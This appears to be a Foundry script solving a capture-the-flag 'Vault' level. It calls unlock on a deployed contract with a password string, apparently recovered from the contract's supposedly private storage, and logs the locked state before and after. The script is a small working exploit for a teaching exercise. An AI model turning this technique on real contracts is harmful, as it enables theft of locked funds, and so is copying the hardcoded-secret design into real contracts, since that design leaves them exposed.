// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "lib/forge-std/src/Script.sol";
import {Vault} from "../src/Vault.sol";

contract ForceSolution is Script {
    Vault public vault;

    function run() external {
        vm.startBroadcast();

        console.log("Solving Vault...");

        vault = Vault(0x6ad8eF41aD55B845D3c41E0a34F68b0865B3cEAa);

        console.log("Locked: ", vault.locked());
        vault.unlock(bytes32("A very strong secret password :)"));
        console.log("Locked: ", vault.locked());

        vm.stopBroadcast();
        console.log("Vault Solved!");
    }
}
